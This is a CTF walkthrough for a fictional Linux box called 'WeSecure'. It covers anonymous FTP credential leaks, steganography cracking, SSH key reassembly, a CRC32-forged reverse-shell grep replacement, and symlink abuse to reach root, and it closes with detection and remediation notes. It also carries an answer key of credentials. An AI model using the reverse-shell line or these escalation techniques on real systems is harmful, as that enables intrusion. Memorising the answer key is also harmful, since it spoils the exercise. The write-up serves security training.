# WeSecure: Official Walkthrough

> Spoilers. This is the intended solution path, written as a solve from zero knowledge. Flag values for `user.txt` and `root.txt` are omitted; you capture those on the box. Credentials recovered along the way are shown, since a walkthrough needs them.

**Difficulty:** Medium · **Flags:** `user.txt`, `root.txt` · **Author:** Mahdi Alhakim ([github.com/mahdi-al-hakim](https://github.com/mahdi-al-hakim))

---

## Introduction

WeSecure is a themed Linux boot-to-root: a fictional security firm with a few too many "temporary" conveniences left in production. The intended path chains small, realistic misconfigurations rather than any single exploit. Nothing here needs an external CVE; every step is enumeration, reasoning, and abusing something that was left the way it is for a plausible reason.

If you want the whole path on one page, [attack-chain.md](attack-chain.md) maps it as a diagram. It is a complete spoiler, so it is most useful as a reference after your own attempt or a first read-through.

<details>
<summary><b>Answer key and design notes (full spoilers)</b></summary>

A quick reference for a hint ladder and for other creators reviewing the design. Flag values are intentionally omitted.

**Credentials**

| User | Password |
|------|----------|
| `mmcarTney+0` | `nCQc%.sv09` |
| `john` (user.txt) | `b0rNaking.1` |
| `root_2fa` | `this_is_not_meant_to_be_known` |
| `root` (root.txt) | `security_beyond_measure` |

> Signing in as `root` drops to `root_2fa`, a custom 2FA gate. Full root: `/home/root_2fa/.escape plea5e_give_me_r00t_Access`

**Vulnerable configurations**

1. Anonymous FTP exposes a temporary-passwords file.
2. PDF metadata leaks a hidden directory holding an image with passkey-guarded steganography that names a user.
3. A fragmented SSH private key for `john`, Base64-encoded across `/var/log/.activity.trace`.
4. An ACL write on `/usr/bin/grep` for `john`, exploited through a root cron job that CRC32-checks the binaries it runs.
5. `www-data` can read the 2FA passkey `/etc/.esc-key`, and `mmcarTney+0` can write to an HTTP-public directory, so the key can be symlinked and read over HTTP.

</details>

---

## Recon

Start with a full TCP scan. The default nmap range would miss the FTP service, which is parked on a high port, so scan everything with `-p-`.

```bash
nmap -Pn -sC -sV -p- <target>
```

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.58 ((Ubuntu))
2222/tcp  open  ssh     OpenSSH 9.6p1 Ubuntu
61676/tcp open  ftp     vsftpd 3.0.5
```

Three services: a web app on 80, SSH moved to 2222, and anonymous-looking FTP on 61676. SSH gives us nothing without credentials, so the web app and FTP are where enumeration starts.

## FTP

vsftpd on a non-standard port with anonymous enabled is worth a look first because it is cheap.

```bash
ftp <target> 61676
# Name: anonymous  (no password)
```

A quick gotcha: passive mode hangs. This server only supports active mode (`pasv_enable=NO`), which the classic `ftp` client uses by default, so listing and downloads work there. Passive-only tools (`curl`, `wget`, a browser, python `ftplib` in default mode) will just time out, which is easy to misread as "FTP is broken."

```bash
ftp> ls
# -rw-r--r--  1 ftp ftp  ...  temporary_pass.txt
ftp> get temporary_pass.txt
```

```
Hello Team!
I have configured your accounts, please find your ID number and login with your corresponding temporary password.
DON'T FORGET TO CHANGE YOUR PASSWORDS!

ID1:x4Rea_(A2
ID2:nCQc%.sv09
ID3:34_ne%.17B
```

Three temporary passwords, but no usernames yet. Nothing to spray against SSH until we have names, so hold onto these and move to the web app.

## Web

Browsing to the site (add the vhost first, `<target> wesecure.vh`, to `/etc/hosts`) shows a generic "cybersecurity agency" page. Source is clean, no obvious comments.

A content discovery pass is the natural next step. A plain directory brute against the web root turns up nothing interesting on its own:

```bash
gobuster dir -u http://wesecure.vh/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
# only the expected pages (index, css/js); no hidden path here
```

So the app root is a dead end. The lead is elsewhere: the page footer links a downloadable PDF, `WeSecure_Terms_and_Services.pdf`, served from `/termsofuse/`. Read the document and it mentions a `/sandbox_env/` directory, which turns out to be a decoy (it 404s). Documents are worth checking for metadata, though:

```bash
exiftool WeSecure_Terms_and_Services.pdf
```

```
Keywords : Cybersecurity, Compliance, Sandbox, TemporaryStorage, /projects_integration~temporary/
```

The `Keywords` field leaks a real path. Browsing `http://wesecure.vh/projects_integration~temporary/` returns a work-in-progress page with a comment in the source:

```html
<!-- Hey John, refer to the file in my hidden directory-->
```

Now we have a username to remember (`john`) and a hint about a *hidden* directory. A normal wordlist against this directory finds nothing, because the directory name is dot-prefixed and dotfiles are skipped by default listings. Fuzz specifically for a leading-dot entry:

```bash
ffuf -u http://wesecure.vh/projects_integration~temporary/.FUZZ \
     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# -> .part01   (200)
```

`.part01/` is browsable (directory listing is enabled there) and holds `temp.js` and `logo_design_concept.jpeg`.

### Steganography

`temp.js` is unremarkable. A logo image sitting alone in a hidden work-in-progress directory is suspicious, so check it for embedded data:

```bash
steghide info logo_design_concept.jpeg
# prompts for a passphrase -> there IS embedded content, it is just protected
```

An empty passphrase and the three temporary passwords from FTP do not unlock it, so fall back to brute-forcing the passphrase against a wordlist. Any steghide cracker works; `stegseek` is fast because it does not shell out per guess:

```bash
stegseek logo_design_concept.jpeg /usr/share/wordlists/rockyou.txt
# [i] Found passphrase: "a5dam."
steghide extract -sf logo_design_concept.jpeg -p "a5dam."
cat PID1678_tracker.txt
```

```
Tracker PID: 1678
File Name: logo_design_concept.jpeg
Creator: mmcarTney+0
```

That gives a username, `mmcarTney+0`. Pairing it with the temporary passwords, `ID2` works.

## Foothold: mmcarTney+0

```bash
ssh -p 2222 mmcarTney+0@<target>   # password: nCQc%.sv09
```

With a shell, the first pass is the usual: `sudo -l` (nothing), a SUID sweep (nothing new), and a look at readable files. Listing `/var/log` turns up something that does not belong there, a world-readable dotfile:

```bash
ls -la /var/log | grep -i activity
# -rw-r--r-- 1 root root ... .activity.trace
```

Reading it, most of the file is ordinary noise, but a `debug.sh` process has been logging Base64 blobs tagged `B64-FRAG`:

```bash
grep 'B64-FRAG' /var/log/.activity.trace
```

```
... debug.sh[...]: Debug: B64-FRAG => LS0tLS1CRUdJTiBPUEVOU1NI...
... debug.sh[...]: Debug: B64-FRAG => ...
... debug.sh[...]: Debug: B64-FRAG => ...
```

Three `B64-FRAG` lines. Each is Base64; the first decodes to `-----BEGIN OPENSSH PRIVATE KEY-----`. Decode each fragment on its own and concatenate the results in order to rebuild the private key. Decode each fragment separately rather than joining the Base64 strings first, since each is independently padded and a single `base64 -d` over the joined text would break on the padding:

```bash
grep 'B64-FRAG' /var/log/.activity.trace | awk '{print $NF}' | while read -r f; do
  printf '%s' "$f" | base64 -d
done > id_rsa
chmod 600 id_rsa
head -1 id_rsa   # -----BEGIN OPENSSH PRIVATE KEY-----
```

The key is passphrase-protected. Crack it, then use it:

```bash
ssh2john id_rsa > rsa.hash
john rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt   # -> 142536
ssh -p 2222 -i id_rsa john@<target>                          # passphrase: 142536
```

The public half of this key is in `john`'s `authorized_keys`, so it logs us in as `john`.

### User flag

```bash
cat ~/user.txt      # value omitted; capture it yourself
```

## Privilege escalation: john to root_2fa

As `john`, enumerate again. `/etc/crontab` has an entry that runs every minute as another user:

```
* * * * * root_2fa /opt/sysutils/verified_run.sh --exec=/usr/local/bin/monitor.sh
```

Read the scripts. `verified_run.sh` extracts the command names used by `monitor.sh`, and for each one that resolves to a `/usr/bin/<name>` binary, it compares that binary's CRC32 against a stored value in `/etc/verified_run/checksums/` before running the script. `monitor.sh` uses `grep`. So the cron runs `monitor.sh` as `root_2fa` only if `/usr/bin/grep` still matches its stored checksum.

The check only holds if `/usr/bin/grep` cannot be tampered with, so the question is whether we can modify it. Standard permissions say no, but ACLs are separate and easy to overlook (linpeas flags unusual ACLs; here we already know the cron depends on `grep`, so check that binary directly):

```bash
getfacl /usr/bin/grep
# user:john:rwx      <- john has an explicit write ACL
```

That is the whole vulnerability: `john` can replace a binary that a root-owned job runs, and the only control in the way is a CRC32 check. A CRC detects accidental corruption, not a deliberate forgery. CRC32 is linear, so for any file you can choose a few bytes to force the checksum to whatever value you want. The plan follows from that: overwrite `grep` with a reverse-shell payload, keep some leading whitespace as scratch space, then patch those scratch bytes so the file's CRC32 equals the stored value again.

How you compute that patch is up to you; any tool or script that can force a CRC32 will do. A concise, widely used one is Project Nayuki's [`forcecrc32.py`](https://www.nayuki.io/page/forcing-a-files-crc-to-any-value), which takes a file, a byte offset, and a target CRC. Using it here, with the leading whitespace at offset 0 as the scratch bytes:

```bash
# example payload; any reverse shell works. the leading spaces are scratch bytes for the forge.
echo -e '          \n#!/bin/bash\nbash -i >& /dev/tcp/<attacker>/4444 0>&1' > /usr/bin/grep
python3 forcecrc32.py /usr/bin/grep 0 $(cat /etc/verified_run/checksums/grep.txt)
```

Start a listener and wait one minute for the cron to fire. The checksum check passes against the forged value, `monitor.sh` runs, and calling our fake `grep` returns a shell as `root_2fa`:

```bash
nc -lvnp 4444
# ... connection: id -> uid=1003(root_2fa)
```

## Privilege escalation: root_2fa to root

`id` confirms we are `root_2fa`, which is still not root. Enumerating from this shell, a SUID sweep flags an unusual root-owned binary sitting in root_2fa's own home:

```bash
find / -perm -4000 -type f 2>/dev/null | grep -v '^/usr/'
# /home/root_2fa/.escape
ls -la /home/root_2fa/.escape   # ---s--x--x root root_2fa
```

Running it asks for a key and rejects a wrong one. `strings` shows where the key comes from:

```bash
strings /home/root_2fa/.escape | grep -i key
# /etc/.esc-key
```

`/etc/.esc-key` is `root:root` and not readable by `root_2fa`. But its ACL grants `www-data` read access:

```bash
getfacl /etc/.esc-key
# user:www-data:r--
```

So the passkey is readable by `www-data` but not by `root_2fa` or us directly. The web server runs as `www-data`, and back in `.part01` we have a directory that `mmcarTney+0` owns and Apache serves, with `FollowSymLinks` enabled. That is a confused deputy: place a symlink to the key inside that directory, request it over HTTP, and Apache follows the link and hands back the key's contents as `www-data`.

```bash
# from your mmcarTney+0 session (still open), since that user owns .part01:
ln -s /etc/.esc-key /var/www/wesecure/projects_integration~temporary/.part01/key
curl http://wesecure.vh/projects_integration~temporary/.part01/key
# plea5e_give_me_r00t_Access
```

Hand that key to `.escape` from the `root_2fa` shell (use the full path, since the reverse shell does not start in that home directory):

```bash
/home/root_2fa/.escape plea5e_give_me_r00t_Access
# Key accepted. Entering root...
id   # uid=0(root)
```

### Root flag

```bash
cat /root/root.txt      # value omitted; capture it yourself
```

---

## Beyond root: detection and design

**How a defender would catch this.** Each stage leaves a distinct signal.

- FTP: an anonymous login followed by retrieval of a credentials file from `/srv/ftp` shows up in vsftpd's transfer log. The real alert is simpler: an FTP server exposing a password file at all.
- Web: directory fuzzing against `.FUZZ` produces a burst of 404s in the access log, and a request for a symlinked file inside a user-writable web directory is anomalous on its own.
- Foothold: the SSH key is reassembled offline, so the only host-side signal is john's first key-based login from a new source.
- Privilege escalation: the cron's `verified_run.sh` is meant to be the tripwire, but it fails open against a forged CRC32. Real controls would fire here: `auditd` watching writes to `/usr/bin/grep`, or a keyed signature that a forgery cannot satisfy.
- Root: the SUID `.escape` execution and the web user's read of `/etc/.esc-key` through a symlink are both auditable events.

**Design intent.** The escalation models misconfigurations that occur in real systems: treating a checksum as a security control, and letting one service read a secret on another principal's behalf. The enumeration half (metadata leak, steganography, a key fragmented across a log) is more CTF-conventional; it exists to make discovery non-trivial, and its lesson is the plain one: do not leak internal paths in document metadata, and never write key material to logs.

**Remediation.**

- Verify integrity with a keyed signature (HMAC or code signing), not a CRC.
- Remove ACL write access to system binaries, and monitor the ones a privileged job depends on.
- Keep temporary directories, credentials files, and internal paths out of production web roots.
- Scrub metadata from published documents and images.
- Restrict access to logs and never write keys or credentials to them.
- Rotate and retire temporary credentials.
